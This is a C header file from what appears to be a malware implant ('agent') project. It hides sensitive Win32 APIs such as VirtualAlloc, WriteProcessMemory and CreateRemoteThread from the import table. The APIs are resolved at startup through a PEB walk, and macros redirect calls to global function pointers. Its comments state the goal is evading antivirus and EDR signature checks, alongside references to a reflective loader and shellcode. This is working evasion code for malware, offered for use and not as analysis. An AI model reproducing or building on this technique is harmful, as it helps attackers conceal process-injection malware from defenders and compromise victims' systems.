/*
 * iat_hide.h — Remove sensitive Win32 APIs from the IAT.
 *
 * Problem: GetProcAddress, LoadLibraryA, VirtualAlloc, etc. in the IAT
 * is an instant AV signature. Every AV/EDR checks the import table first.
 *
 * Solution: Resolve these APIs once at startup via PEB walk + export table
 * parsing (api_resolve.c), store in global function pointers, then #define
 * the Win32 names to point at our resolved copies. The linker never sees
 * a reference to the real import, so it never appears in the IAT.
 *
 * MUST be included AFTER <windows.h> (which agent.h guarantees).
 *
 * NOTE: This file is NOT used by reflective_loader.c (standalone PIC shellcode).
 */
#ifndef IAT_HIDE_H
#define IAT_HIDE_H

#include "api_resolve.h"

/* ═══════════════════════════════════════════════════════════════════
 *  Function pointer type definitions
 * ═══════════════════════════════════════════════════════════════════ */

/* kernel32 — loader / memory */
typedef HMODULE (WINAPI *pfn_LoadLibraryA)(LPCSTR);
typedef HMODULE (WINAPI *pfn_LoadLibraryW)(LPCWSTR);
typedef FARPROC (WINAPI *pfn_GetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *pfn_GetModuleHandleA)(LPCSTR);
typedef HMODULE (WINAPI *pfn_GetModuleHandleW)(LPCWSTR);

/* kernel32 — virtual memory */
typedef LPVOID  (WINAPI *pfn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef LPVOID  (WINAPI *pfn_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *pfn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *pfn_VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *pfn_VirtualFree)(LPVOID, SIZE_T, DWORD);

/* kernel32 — process / thread */
typedef HANDLE  (WINAPI *pfn_OpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL    (WINAPI *pfn_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL    (WINAPI *pfn_ReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
typedef HANDLE  (WINAPI *pfn_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
                                                  LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL    (WINAPI *pfn_CreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES,
                                              LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID,
                                              LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef HANDLE  (WINAPI *pfn_GetCurrentProcess)(void);

/* ═══════════════════════════════════════════════════════════════════
 *  Global resolved function pointers (defined in iat_hide.c)
 * ═══════════════════════════════════════════════════════════════════ */

extern pfn_LoadLibraryA       g_pLoadLibraryA;
extern pfn_LoadLibraryW       g_pLoadLibraryW;
extern pfn_GetProcAddress     g_pGetProcAddress;
extern pfn_GetModuleHandleA   g_pGetModuleHandleA;
extern pfn_GetModuleHandleW   g_pGetModuleHandleW;
extern pfn_VirtualAlloc       g_pVirtualAlloc;
extern pfn_VirtualAllocEx     g_pVirtualAllocEx;
extern pfn_VirtualProtect     g_pVirtualProtect;
extern pfn_VirtualProtectEx   g_pVirtualProtectEx;
extern pfn_VirtualFree        g_pVirtualFree;
extern pfn_OpenProcess        g_pOpenProcess;
extern pfn_WriteProcessMemory g_pWriteProcessMemory;
extern pfn_ReadProcessMemory  g_pReadProcessMemory;
extern pfn_CreateRemoteThread g_pCreateRemoteThread;
extern pfn_CreateProcessW     g_pCreateProcessW;
extern pfn_GetCurrentProcess  g_pGetCurrentProcess;

/* ═══════════════════════════════════════════════════════════════════
 *  Initialize — call once at agent startup BEFORE anything else.
 *  Returns TRUE if all critical APIs resolved.
 * ═══════════════════════════════════════════════════════════════════ */

BOOL iat_hide_init(void);

/* ═══════════════════════════════════════════════════════════════════
 *  Redirect macros — all existing code calling GetProcAddress() etc.
 *  now transparently goes through the PEB-resolved pointer.
 *
 *  This MUST come after <windows.h> has declared the originals.
 *  Skipped when IAT_HIDE_IMPL is defined (i.e. inside iat_hide.c itself,
 *  which needs the real Win32 names to define the globals).
 * ═══════════════════════════════════════════════════════════════════ */

#ifndef IAT_HIDE_IMPL

/* Undefine any existing macros from windows.h (MSVC compat) */
#ifdef LoadLibraryA
#undef LoadLibraryA
#endif
#ifdef LoadLibraryW
#undef LoadLibraryW
#endif
#ifdef GetProcAddress
#undef GetProcAddress
#endif
#ifdef GetModuleHandleA
#undef GetModuleHandleA
#endif
#ifdef GetModuleHandleW
#undef GetModuleHandleW
#endif

#define LoadLibraryA       g_pLoadLibraryA
#define LoadLibraryW       g_pLoadLibraryW
#define GetProcAddress     g_pGetProcAddress
#define GetModuleHandleA   g_pGetModuleHandleA
#define GetModuleHandleW   g_pGetModuleHandleW
#define VirtualAlloc       g_pVirtualAlloc
#define VirtualAllocEx     g_pVirtualAllocEx
#define VirtualProtect     g_pVirtualProtect
#define VirtualProtectEx   g_pVirtualProtectEx
#define VirtualFree        g_pVirtualFree
#define OpenProcess        g_pOpenProcess
#define WriteProcessMemory g_pWriteProcessMemory
#define ReadProcessMemory  g_pReadProcessMemory
#define CreateRemoteThread g_pCreateRemoteThread
#define CreateProcessW     g_pCreateProcessW
#define GetCurrentProcess  g_pGetCurrentProcess

#endif /* !IAT_HIDE_IMPL */

#endif /* IAT_HIDE_H */
